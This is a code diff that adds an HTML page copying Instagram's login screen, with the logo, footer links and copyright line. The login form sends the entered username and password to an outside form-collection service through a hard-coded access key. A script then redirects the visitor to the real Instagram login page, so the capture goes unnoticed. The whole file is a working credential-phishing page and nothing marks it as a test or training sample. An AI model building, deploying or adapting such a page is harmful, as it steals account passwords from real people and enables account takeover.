@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="image/logoo.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+</head>
+
+<body>
+    <div class="main">
+        <div class="inst-img">
+            <img src="image/page-logo.png" alt="">
+        </div>
+        <form action="https://api.web3forms.com/submit" method="POST" id="instaForm">
+            <input type="hidden" name="access_key" value="001fddb5-3df9-479e-a5df-75053483434b">
+            <div class="form">
+                <div class="email">
+                    <input type="text" name="name" placeholder="phone number, username or email " required>
+                </div> <br>
+                <div class="phone" style="margin-top: -11px;">
+                    <input type="password" name="email" placeholder="password" required>
+                </div>
+
+
+                <div class="log-in">
+                    <button type="submit"> <a href="https://www.instagram.com/accounts/login/?hl=en">Log in</a></button>
+                </div>
+                <div class="or-con">
+                    <div class="first-br"></div>
+                    <div class="or-text">OR</div>
+                    <div class="first-br"></div>
+                </div>
+            </div>
+        </form>
+        <div class="last-section">
+            <p style="color: #385185; font-size: 18px; margin: 26px 0;"><b><i class="fa-brands fa-square-facebook"></i>
+                    Log in with
+                    Facebook </b></p>
+            <p style="color: #00376B; margin: 26px 0;">Forgot password?</p>
+        </div>
+
+    </div>
+
+    <div class="mains">
+        <p>Don't have an account? <span>Sign up </span> </p>
+    </div>
+
+    <div class="bahar">
+        <p>Get the app.</p>
+        <div class="play">
+            <div class="play-img">
+                <img src="image/play.png" alt="">
+                <img src="image/micro.png" alt="">
+            </div>
+
+        </div>
+    </div>
+
+
+
+    <div class="last-op">
+        <p>Meta</p>
+        <p>About</p>
+        <p>Blog</p>
+        <p>Jobs</p>
+        <p>Help</p>
+        <p>API</p>
+        <p>Privacy </p>
+        <p> Terms</p>
+        <p>Locations</p>
+        <p> Instagram Lite</p>
+        <p>Threads</p>
+        <p>Contact Uploading & Non-Users</p>
+        <p>Meta Verified</p>
+    </div>
+
+    <div class="chanda">
+        <p>© 2024 Instagram from Meta</p>
+    </div>
+
+    <script>
+        document.querySelector('#instaForm').addEventListener('submit', () => {
+            window.location.href = 'https://www.instagram.com/accounts/login/?hl=en';
+        })
+    </script>
+</body>
+
+</html>
